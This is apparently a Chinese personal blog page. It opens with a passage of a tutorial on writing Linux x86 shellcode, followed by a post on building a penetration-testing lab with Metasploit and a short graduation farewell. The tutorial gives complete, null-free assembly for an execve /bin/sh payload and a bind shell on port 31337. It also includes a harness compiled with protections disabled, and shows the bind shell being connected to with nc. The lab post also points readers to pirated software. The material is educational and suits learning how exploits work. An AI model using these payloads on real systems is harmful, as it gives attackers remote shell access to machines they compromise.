<pre><code>~/Work/<span class="keyword">notes</span>/shellcode ⮀ <span class="keyword">cat</span> &gt;&gt; <span class="keyword">test</span>.<span class="keyword">sh</span> &lt;&lt; EOF
#! /bin/env bash
nasm <span class="string">"$1"</span> # 用nasm 获取机器码

<span class="keyword">cat</span> &gt;&gt; <span class="keyword">test</span>.c &lt;&lt; EOF_FLAG # 生成测试shellcode的程序文件
<span class="comment">/* shellprogram.c */</span>
<span class="keyword">char</span> code[] = 
EOF_FLAG
# 生成C数组形式的shellcode并写入测试程序文件 
od -tx1 <span class="string">"`basename "</span><span class="label">$1</span><span class="string">" .asm`"</span> | cut -c8-80 | sed -<span class="keyword">e</span> 's/ /\\x/<span class="keyword">g</span>' | sed -<span class="keyword">e</span> 's/^/<span class="string">"/g' | sed -e 's/$/"</span>/<span class="keyword">g</span>' &gt;&gt; <span class="keyword">test</span>.c

echo <span class="string">"\"</span>\<span class="string">";"</span> &gt;&gt; <span class="keyword">test</span>.c
# 主程序 
<span class="keyword">cat</span> &gt;&gt; <span class="keyword">test</span>.c &lt;&lt; EOF_FLAG
int main(int argc, <span class="keyword">char</span> *argv[])
{
  int (*exeshell)();
  exeshell = (int (*)()) code;
  (int)(*exeshell)();
}
EOF_FLAG
# 编译程序并清理
gcc -fno-<span class="keyword">stack</span>-protector -z execstack -m32 -o tester <span class="keyword">test</span>.c
<span class="keyword">rm</span> <span class="keyword">test</span>.c
./tester
<span class="keyword">rm</span> tester
EOF
</code></pre><p>这个程序会直接运行你的shellcode咒语。</p>
<h2 id="编写Shellcode黑魔法咒语">编写Shellcode黑魔法咒语</h2><p>在Linux系统中，法师们可以通过系统调用(syscall)直接和内核交互，这使得在Linux下编写shellcode非常直观方便。你可以在网上找到Linux系统调用的快速参考表格，这些系统调用经久不变。你可以这样快速查找调用号。当然可以把以下内容写成个简易脚本来减少击键次数。</p>
<pre><code>~/Work/notes/shellcode ⮀ grep execve /usr/include/asm/unistd_32<span class="class">.h</span> 
<span class="hexcolor">#def</span>ine __NR_execve <span class="number">11</span>
</code></pre><p>使用汇编来进行系统调用很直观，首先，32位cpu有8个通用寄存器(分别称为eax, ebx, ecx， edx, esi, edi, ebp, esp)，如何使用他们通常约定俗成。你需要把查找到的调用号推入eax中, 借着把该调用的参数依次推入ebx， ecx， edx， esi， edi，紧接着是一个<code>int 0x80</code>中断表示参数和调用哪个函数都指定了，现在可以开始调用了。</p>
<p>那么这些系统调用的参数如何查阅呢？俗话说男人最重要，谷哥是其次。这时候就man吧，比如查看<code>execve</code>用法</p>
<pre><code>~/Work/notes/shellcode ⮀ man execve
.... Lots of things.....
SYNOPSIS
       <span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span>

       <span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[],
                  <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;
</code></pre><p>在综述中(Synopsis)可以看到函数原型，那些参数就是要推入ebx， ecx， edx的东西。</p>
<p>但是怎么把<code>const char *filename</code>这些参数推入寄存器中呢？这时候就要利用栈了(stack)我们把参数推到栈上，然后把地址推入寄存器。</p>
<p>首先我们看看如何把调用号推入eax中</p>
<p>为了使shellcode中不包含<code>\x00</code>即C语言中的NULL(至于为什么，这些字符是字符串定届符，而shellcode很多是通过字符串注入，如果shellcode中包含这种字符，显然会被截断)，我们不能直接这样</p>
<pre><code><span class="keyword">mov</span> <span class="literal">eax</span>，<span class="number">0xb</span>
</code></pre><p>这里我用的是metasploit项目tools中的<code>nasm_shell.rb</code>，可以很方便的用来查看汇编对应的机器码。</p>
<pre><code>nasm &gt; <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0xb</span>
<span class="number">00000000</span>  B80B000000        <span class="keyword">mov</span> <span class="literal">eax</span>,<span class="number">0xb</span>
</code></pre><p>显然有好多0,因为我们mov时mov的是整个32位0xb，我们可以先将eax通过xor运算变为0，再将0xb推入低十六位。</p>
<pre><code>nasm &gt; <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
<span class="number">00000000</span>  31C0              <span class="keyword">xor</span> <span class="literal">eax</span>,<span class="literal">eax</span>
nasm &gt; <span class="keyword">mov</span> <span class="literal">al</span>, <span class="number">0xb</span>
<span class="number">00000000</span>  B00B              <span class="keyword">mov</span> <span class="literal">al</span>,<span class="number">0xb</span>
</code></pre><p>还有能让shellcode更短的方法，这个方法利用了栈。向栈推入一子节的0xb，然后弹出到eax中。你总是希望shellcode更短，shellcode越短，能运用的范围就越大。</p>
<pre><code>nasm &gt; <span class="keyword">push</span> <span class="preprocessor">BYTE</span> <span class="number">11</span>
<span class="number">00000000</span>  6A0B              <span class="keyword">push</span> <span class="preprocessor">byte</span> +<span class="number">0xb</span>
nasm &gt; <span class="keyword">pop</span> <span class="literal">eax</span>
<span class="number">00000000</span>  <span class="number">58</span>                <span class="keyword">pop</span> <span class="literal">eax</span>
</code></pre><p>接着让我们看看如何把参数依次推入ebx， ecx和edx。为了清晰起见再次将综述列到下面。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[],</span><br><span class="line">           <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure>
<p>我们要想在shellcode中运行一个shell(这就是为何称为shellcode，获取控制的顶尖方法)可以<code>int execve(address of &quot;/bin//sh&quot;, address of [&quot;/bin//sh&quot;, NULL], NULL)</code></p>
<p>shellcode中的地址都应该是相对取地址，因为不知道shellcode会被注入到程序的哪些部分，任何硬编码都是不可取的。</p>
<p>我们利用栈完成一切相对取址。通过操作我们使栈顶看起来这样</p>
<pre><code>+++++
<span class="string">"/bin"</span>  &lt;-- 地址<span class="number">1</span>：四字节，<span class="number">32</span>位字符串,同时这里是栈顶，即esp(在ia32架构中是这样)
+++++
<span class="string">"//sh"</span>  &lt;-- 地址<span class="number">2</span>：<span class="number">32</span>位字符串，<span class="comment">//在unix系统中与/并无区别</span>
+++++
<span class="literal">NULL</span>    &lt;-- 地址：空字符<span class="literal">NULL</span>
......
</code></pre><p>这是这几步</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor ecx, ecx&#10;push ecx&#10;push 0x68732f2f&#10;push 0x6e69622f&#10;mov ebx, esp</span><br></pre></td></tr></table></figure>
<p>你好奇那些<code>0x687322f2f</code>什么的怎么来的？</p>
<pre><code>~/Work/notes/shellcode ⮀ echo -ne <span class="string">"/bin//sh"</span> |od -tx4
<span class="number">0000000</span> <span class="number">6e69622</span>f <span class="number">68732f</span>2f
</code></pre><p>将esp即字符串<code>&quot;/bin//sh&quot;</code>的地址推入ebx，推入第一个参数。之后将一个NULL推入栈，栈变成这样</p>
<pre><code>+++++
<span class="literal">NULL</span>    &lt;-- 新栈顶，<span class="literal">NULL</span>
+++++
<span class="string">"/bin"</span>  &lt;-- 地址<span class="number">1</span>：四字节，<span class="number">32</span>位字符串地址
+++++
<span class="string">"//sh"</span>  &lt;-- 地址<span class="number">2</span>：<span class="number">32</span>位字符串，<span class="comment">//在unix系统中与/并无区别</span>
+++++
<span class="literal">NULL</span>    &lt;-- 地址<span class="number">3</span>：空字符<span class="literal">NULL</span>，界定字符串
......
</code></pre><p>这几步如下，将NULL的地址推入edx</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push ecx&#10;xor edx, edx&#10;mov edx, esp</span><br></pre></td></tr></table></figure>
<p>把字符串的地址推入栈，则栈如下所示：</p>
<pre><code>+++++
地址<span class="number">1</span>   &lt;-- 新栈顶esp，也是数组[address of <span class="string">"/bin//sh"</span>, <span class="literal">NULL</span>]的地址
+++++
<span class="literal">NULL</span>    &lt;-- <span class="literal">NULL</span>
+++++
<span class="string">"/bin"</span>  &lt;-- 地址<span class="number">1</span>：四字节，<span class="number">32</span>位字符串地址
+++++
<span class="string">"//sh"</span>  &lt;-- 地址<span class="number">2</span>：<span class="number">32</span>位字符串，<span class="comment">//在unix系统中与/并无区别</span>
+++++
<span class="literal">NULL</span>    &lt;-- 地址<span class="number">3</span>：空字符<span class="literal">NULL</span>，界定字符串
......
</code></pre><p>这几步如下所示：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push ebx&#10;mov ecx, esp</span><br></pre></td></tr></table></figure>
<p>接着，各个参数都已经推入相应寄存器，直接开始调用<code>int 0x80</code></p>
<h2 id="验证我们的咒语">验证我们的咒语</h2><p>把你的shellcode保存为任意以<code>.asm</code>为后缀的文件。比如<code>shellcode.asm</code></p>
<p>用之前我们的测试脚本生成可执行文件：</p>
<pre><code>~/Work/<span class="keyword">notes</span>/shellcode ⮀ <span class="keyword">sh</span> <span class="keyword">test</span>.<span class="keyword">sh</span> shellcode.asm
<span class="keyword">sh</span>-4.2$ 
</code></pre><p>非常棒！！</p>
<h2 id="绑定端口的shellcode">绑定端口的shellcode</h2><p>如果你是通过某种法术把shellcode咒语施加到某个远程的程序上，一个在远程机器本地提供的shell没有丝毫用处。你需要绑定端口，然后使用TCP/IP瑞士军刀netcat来远程打开一个shell。</p>
<p>为了将一个shell绑定到某个端口(比如31337端口，注意1024以下FIXME端口号的绑定需要root权限)上，需要做以下几步，我们先写出等效的C程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sockfd, new_sockfd;</span><br><span class="line">  <span class="keyword">struct</span> sockaddr_in host_addr, client_addr;</span><br><span class="line">  <span class="keyword">socklen_t</span> sin_size;</span><br><span class="line">  <span class="keyword">int</span> yes=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  sockfd = socket(PF_INET, SOCK_STREAM, <span class="number">0</span>); <span class="comment">// 建立一个流套接字</span></span><br><span class="line">  host_addr.sin_family = AF_INET; <span class="comment">// 定义协议族</span></span><br><span class="line">  host_addr.sin_port = htons(<span class="number">31337</span>); <span class="comment">// 定义端口号，注意本地到网络字节序转换</span></span><br><span class="line">  host_addr.sin_addr.s_addr = INADDR_ANY; <span class="comment">// 用本地IP填满</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;(host_addr.sin_zero), <span class="string">'\0'</span>, <span class="number">8</span>); <span class="comment">// 剩余空位用0填充</span></span><br><span class="line">  <span class="comment">// 将流套接字绑定到本地31337端口</span></span><br><span class="line">  bind(sockfd, (<span class="keyword">struct</span> sockaddr *)&amp;host_addr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr));</span><br><span class="line"></span><br><span class="line">  listen(sockfd, <span class="number">4</span>); <span class="comment">// 监听</span></span><br><span class="line">  sin_size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">  new_sockfd = accept(sockfd, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, &amp;sin_size);</span><br><span class="line">  dup2(new_sockfd, <span class="number">0</span>);</span><br><span class="line">  dup2(new_sockfd, <span class="number">1</span>);</span><br><span class="line">  dup2(new_sockfd, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">char</span> *newargv[] = &#123; <span class="string">"/bin/sh"</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="keyword">char</span> *newenviron[] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">  execve(<span class="string">"/bin/sh"</span>, newargv, newenviron);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在linux中，可以直接和内核进行交互调用一个叫<code>socketcall</code>的syscall来使用这些函数</p>
<pre><code>~/Work/notes/shellcode ⮀ grep socketcall /usr/include/asm/unistd_32<span class="class">.h</span> 
<span class="hexcolor">#def</span>ine __NR_socketcall <span class="number">102</span>
</code></pre><p>函数的用法<code>man socketcall</code>。第一个参数在<code>/usr/include/linux/net.h</code>中寻找。</p>
<p>那么，在我们的shellcode中实现和C中一样，只是直接调用了系统调用socketcall。</p>
<p>首先建立一个套接字，用法请自行<code>man socket</code>。</p>
<pre><code><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;
</code></pre><p>协议族(domain)是2(<code>PF_INET</code>，或者<code>AF_INET</code>,一样的)，类型(type)为1(<code>SOCK_STREAM</code>)，协议(protocol)为0(这个协议族只有一个协议，0就可以了)。奇怪这些数字哪里来的？<code>cat /usr/include/bits/socket.h</code>中自行grep。</p>
<p>当我们用如下汇编语言来进行syscall之后，套接字句柄返回到eax中，我们用一个高效精简的指令把它放到esi中暂存。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; s = socket(2, 1, 0) or socketcall(1, &#38;(2,1,0))&#10;  push BYTE 0x66 &#9;; syscall 102&#10;  pop eax &#10;  cdq &#9;&#9;; &#23558;eax&#25193;&#23637;&#20026;&#20445;&#23384;&#22312;eax:edx&#20013;&#30340;64&#20301;&#25968;&#65292;&#23558;edx&#28165;&#20026;0&#10;  xor ebx, ebx &#9;; &#23558;ebx&#28165;0&#10;  inc ebx &#9;&#9;; 1 = socket()&#10;  push edx&#9;&#9;; &#23558;NULL&#25512;&#20837;&#22534;&#26632; &#21442;&#25968;&#21015;&#34920; ( protocol = 0&#10;  push BYTE 0x1&#9;; &#23558;8&#20301;1&#25512;&#20837;&#26632;   (&#36870;&#24207;)      SOCK_STREAM = 1&#10;  push BYTE 0x2&#9;; &#23558;8&#20301;2&#25512;&#20837;&#26632;               AF_INET = 2)&#10;  mov ecx, esp &#9;; &#23558;&#26632;&#39030;&#22320;&#22336;&#25512;&#20837;ecx&#10;  int 0x80</span><br></pre></td></tr></table></figure>
<p>接下来,将该套接字绑定(bind)到端口31337上,监听(listen)此端口,接收(accept)。方式和以上完全一样，不做详细解释。只在汇编程序中做一些必要的注释。遇到问题请man.</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; bind(s, [2, 31337, 0], 16)&#10;  push BYTE 0x66&#10;  pop eax&#10;  inc ebx&#10;  push edx&#10;  push WORD 0x697a; inverse order&#10;  push WORD bx&#10;  mov ecx, esp ; server struct pointer&#10;  push BYTE 16&#10;  push ecx&#10;  push esi&#10;  mov ecx, esp; argument array&#10;  int 0x80&#10;&#10;; listen(s, 0)  &#10;  mov BYTE al, 0x66&#10;  inc ebx&#10;  inc ebx&#10;  push ebx&#10;  push esi&#10;  mov ecx, esp&#10;  int 0x80&#10;&#10;; c = accept(s, 0, 0)&#10;  mov BYTE al, 0x66&#10;  inc ebx&#10;  push edx&#10;  push edx&#10;  push esi&#10;  mov ecx, esp; ecx=argument array&#10;  int 0x80</span><br></pre></td></tr></table></figure>
<p>然后复制文件描述符到标准输入输出错误：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; dup2(connected socket, &#123;all three standard I/O file descriptors&#125;)&#10;  xchg eax, ebx &#9;; put socket fd in ebx&#10;  push BYTE 0x2&#10;  pop ecx&#10;dup_loop: &#9;&#9;; &#20351;&#29992;&#24490;&#29615;&#26469;&#23558;&#25991;&#20214;&#25551;&#36848;&#31526;&#22797;&#21046;&#10;  mov BYTE al, 0x3F&#9;; &#26631;&#20934;&#36755;&#20837; 0&#10;  int 0x80&#9;&#9;; &#26631;&#20934;&#36755;&#20986; 1&#10;  dec ecx&#9;&#9;; &#26631;&#20934;&#38169;&#35823; 2&#10;  jns dup_loop</span><br></pre></td></tr></table></figure>
<p>最后一步是我们上一步在本地完成的shellcode，启动shell：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; execve(const char *filename, char *const argv[], char *const envp[])&#10;  mov BYTE al, 11&#10;  push edx&#10;  push 0x68732f2f&#10;  push 0x6e69622f&#10;  mov ebx, esp&#10;  push edx&#10;  mov edx, esp&#10;  push ebx&#10;  mov ecx, esp&#10;  int 0x80</span><br></pre></td></tr></table></figure>
<h2 id="验证新的咒语">验证新的咒语</h2><p>启动我们的实验程序：</p>
<pre><code>~/Work/<span class="keyword">notes</span>/shellcode ⮀ <span class="keyword">sh</span> <span class="keyword">test</span>.<span class="keyword">sh</span> bind_shell.asm
</code></pre><p>不要中断它，在另一个终端中用nc连接本地31337端口</p>
<pre><code> ~/Site ⮀ ⭠ master ● ⮀ nc localhost <span class="number">31337</span>
whoami
reverland
id
uid=<span class="number">1000</span>(reverland) gid=<span class="number">1000</span>(reverland) groups=<span class="number">1000</span>(reverland),<span class="number">10</span>(wheel),<span class="number">27</span>(video),<span class="number">35</span>(games),<span class="number">70</span>(postgres),<span class="number">103</span>(vboxusers),<span class="number">997</span>(wireshark)
</code></pre><p>虽然没有提示符，但你仍然可以和它交互。</p>
<h2 id="What’_more">What’ more</h2><p>这些咒语其实很复杂，这篇文章只是匆匆一瞥，希望读者能喜欢。要想了解更多请参阅文末的那些魔法禁书：）</p>
<p>如果有任何指教、建议、意见、痛斥、嘲笑、怀疑、讥讽、不解、感谢都欢迎<em>留言</em>或者通过<em><a href="http://reverland.org">电子邮件</a></em>告知我，我必将毫不留情的……嗯，洗耳恭听。</p>
<p>Happy hacking！</p>
<h2 id="魔法禁书目录">魔法禁书目录</h2><ul>
<li>善良人手册：《The Shellcoder’s Handbook》</li>
<li>黑魔法：挖财宝的艺术：《Hacking：The Art of Exploitation》</li>
<li>揭秘：我没看过这本书：《Shellcoder’s programming uncovered》</li>
</ul>
<p>法师们注意，前两个因特奈特上都有中文版的！</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2013/07/22/build-up-your-own-pt-lab/" itemprop="url">
                  建立渗透测试实验环境
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-07-22T00:00:00+08:00" content="2013-07-22">
              2013-07-22
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2013/07/22/build-up-your-own-pt-lab/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2013/07/22/build-up-your-own-pt-lab/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="用虚拟机建立Host-only靶机内网">用虚拟机建立Host-only靶机内网</h2><p><strong>警告：这是一篇备忘性质的渣指南，不是详尽地教授如何做1+1的用户友好文档。请勿抱太高期望。</strong></p>
<p>大体上原因是忽然觉得metasploit很好玩，可是没有用来实验的机器。在互联网上四处破坏的行为又不可取，我又不想花费什么(也买不起……)买一大堆机器在家中连内网玩(好吧也放不下这么多机器).由于现在虚拟技术很成熟，因此想用虚拟机搭建个渗透测试环境(好吧，说这么高端洋气其实就是个playground)。</p>
<p>对所有新手来说，一个简单的渗透目标对入门并保持兴趣非常重要，幸运的是，总有人已经做过这些事，你可以搜寻到rapid7团队配置好的充满漏洞的metasploitable系列目标机器镜像，还有UltimateLamp。但总有些事在法律上有些人不能做，你需要自己付费购买一个合法的License来安装Windows XP。如果你在下载和搜集资料上遇到问题，可以参见本文的最后部分，如果还有问题，别忘了google是个好东西。</p>
<p>另外，大致哪国法律都不会容忍人在未经许可的情况下对他人正在运营的机器和网络环境实行破坏性的渗透测试，所以，别犯傻。想试试具有破坏性的技术，自己搭建个内网玩。</p>
<h3 id="配置要求">配置要求</h3><p>有些地方写的要求很高，其实用不着太高，但起码得有个支持虚拟技术的cpu。我的是i3，用着就不错.</p>
<p>内存要求至少两G，你得经得起同时运行两三个虚拟机吧。如果宿主机内存太小，即使一个虚拟机只分配256M内存两三个虚拟机最后也能把内存撑到全满，拖得硬盘灯狂亮，图形界面狂卡。好吧，2G其实就是这种情况。但凑合能用，你无需虚拟机运行良好，只需要它在安全上脆弱不堪。</p>
<p>还有就是硬盘空间，你要放置虚拟机镜像文件，可能要放置很多资料和论文，可能会准备一大套工具集并在日后不断扩展。所以，想想硬盘还有多大，当然可以不够用了在想办法，这也不是什么必须的。</p>
<p>综上，感谢万恶的虚拟化技术，即使一个i3 cpu 2G渣内存 30G硬盘空间你也足够建立一个两三个虚拟机器的渗透测试实验室了，而不用花费不菲准备一大堆机器和网线。</p>
<h3 id="metasploitable">metasploitable</h3><p>metasploitable系列第一个镜像大概10年发布，在我的vbox下毫无问题。他的镜像是vmware制成，但vbox可以直接使用vmware的镜像，不要去转换了！</p>
<p>很幸运这个别人帮你配置好了，满是漏洞，能让你玩到无聊。不过却很方便熟悉下metasploit的使用过程。</p>
<p>metasploitable 2 大概2012年释出，悲剧的是，我的vbox无法启动，可是又懒得在渣gentoo上装vmware。无所谓了。</p>
<h3 id="Windows_XP_+_mssql_+_av_+_office_+_…">Windows XP + mssql + av + office + …</h3><p>metasploit中的有些模块，不，是很多模块是有关windows的，甚至是win上的特定软件的。如果你想试试，最好在你的实验室中安装一个xp的虚拟机。另外，个人觉得meterpreter在win下表现得比linux下厉害。</p>
<p>获取正版XP，下载安装mssql，并按照邪恶的魔法禁书《metasploit：渗透测试魔法师指南》P269配置。</p>
<p>当然，有些东西如果想试试还得有其它软件。请自行search并use然后info查看那些exploit的信息。</p>
<h3 id="网络配置">网络配置</h3><p>渗透测试实验室的核心在于几个虚拟机的网络配置。</p>
<p>首先，要保证这些漏洞百出的靶机们与互联网隔绝，省得一不小心成功把互联网上什么政府网站搞挂，然后警察叔叔就找上门了。</p>
<p>vbox可以建立host-only的内网很好的实现宿主机和虚拟机共享的局域网。</p>
<p>首先选中File-Preference-Network添加一个host-only network。默认是vboxnet0，并且dhcp是自动开启的，如果不是，请打开它(当然你也可以对每台机器设置静态地址，我觉得这挺费事，通常我只对宿主机设置静态地址)。</p>
<p>然后在我的渣gentoo中是这样，其它linux发行版大致差不多或类似，unix大致类似，windows自己想办法我不知道：</p>
<pre><code>sudo ifconfig vboxnet0 inet <span class="number">192.168</span><span class="number">.56</span><span class="number">.102</span> netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span> up
</code></pre><p>注意，以上地址自己看怎么写，这都可以在设置dhcp同样的地方设置。</p>
<h2 id="配置metasploit">配置metasploit</h2><p>然后就是在宿主机上设置metasploit，准备好你的枪。建议直接从github上git clone。</p>
<p>metasploit项目在github上的wiki有一个很完整的参考<a href="https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environment" target="_blank" rel="external">Setting Up a Metasploit Development Environment</a></p>
<p>我就说说在gentoo上的问题和为什么不选择gentoo官方源里的稳定版本。</p>
<p>首先，我好像什么依赖问题也没碰到。自己对照ubuntu的看看少什么，你需要libpcap来处理网络流量、一个完整的编译工具链，nasm，curl，wget，还有postgresql作为数据库。总之，我什么问题也没碰到。</p>
<p>然后跟着把rvm装上，完全照着wiki来就是了。</p>
<p>将metasploit项目git clone到本地(别给我说不知道怎么做)，进入到其目录。</p>
<pre><code>./msfconsole
</code></pre><p>如果提示：</p>
<pre><code>[*] Metasploit requires the <span class="keyword">Bundler </span>gem to <span class="keyword">be </span>installed
$ gem install <span class="keyword">bundler</span>
</code></pre><p>照它说得就是。</p>
<p>还有最后一个问题，对metasploit，有一个数据库来跟踪渗透测试过程非常有用。你需要自己配置数据库，默认数据库是postgre，当然你也可以选其它的。</p>
<p>参考这里，虽然是fedora的，基本原理对所有linux发行版都适用:</p>
<p><a href="https://fedoraproject.org/wiki/Metasploit_Postgres_Setup" target="_blank" rel="external">Metasploit Postgres Setup</a></p>
<p>很多不想看拉倒。关键在于创建数据库和用户，然后能在msfconsole里连上就行。</p>
<p>为了方便，你可能想让postgre开机启动。每个发行版可能都不一样吧，gentoo上这样：</p>
<pre><code>sudo rc-update <span class="built_in">set</span> postgresql-<span class="number">9.2</span> <span class="keyword">default</span>
</code></pre><p>至此，你的靶子和枪都准备好了。</p>
<h2 id="使用metasploit">使用metasploit</h2><p>metasploit提供的工具可以分为几类：</p>
<ul>
<li>auxiliary</li>
<li>exploit</li>
<li>tools<br>其它如msfencode，msfpayload</li>
</ul>
<p>不在本文讨论范围内，参考这里<a href="http://www.offensive-security.com/metasploit-unleashed/Main_Page" target="_blank" rel="external">Metasploit Unleashed</a></p>
<h2 id="Social_Engineer_Toolkits">Social Engineer Toolkits</h2><p>部分基于msf的项目，同样是git clone过来，手动配置下运行就是。依赖很简单，都是python的依赖。</p>
<p>可以来玩玩传说中的社交工程，exploit人类比exploit机器省心省力多了= =</p>
<p>更多参见<a href="http://www.social-engineer.org/framework/Social_Engineering_Framework" target="_blank" rel="external">Social Engineering Framework</a></p>
<h2 id="墙内tips">墙内tips</h2><ul>
<li><p>git clone很慢还不能断点，可以先git init然后fetch，最后checkout <code>FETCH_HEAD</code>。。。</p>
</li>
<li><p>找不到的东西就试试海盗湾(自寻)</p>
</li>
<li><p>微软的东西可以从这里找：<a href="http://www.itellyou.cn/" target="_blank" rel="external">MSDN, I tell you</a></p>
</li>
</ul>
<h2 id="参考资料">参考资料</h2><ul>
<li><a href="https://community.rapid7.com/docs/DOC-2196" target="_blank" rel="external">How To Set Up A Penetration Testing Lab</a></li>
</ul>
<p>好吧，扯淡扯完了，Happy hacking</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2013/07/02/goodbye-jnu/" itemprop="url">
                  再见，江大
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-07-02T00:00:00+08:00" content="2013-07-02">
              2013-07-02
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2013/07/02/goodbye-jnu/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2013/07/02/goodbye-jnu/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>昨天晚上帮室友搬家后，宿舍就剩我一个人。一路从欧尚走回江大，看着熟悉而陌生的街景，听着此起彼伏的车来车往，记忆像潮水一样刹也刹不住。往昔的种种在脑海中光影交错，熟悉的城市却变得陌生。</p>
<p>依次送别同学的时候还没感觉，当昨晚面对空荡荡的楼道时，才恍然似乎明白，四年青春落幕，宴席终散。不觉悲从中来，失魂落魄。</p>
<p>时光滚滚向前，去得匆匆，了然无痕。但是斗志昂扬毫无畏惧地向前看吧，记忆永在，青春万岁!</p>
<p>Bye and thanks, Jiangnan University. My classmates and friends, I love you.</p>

            
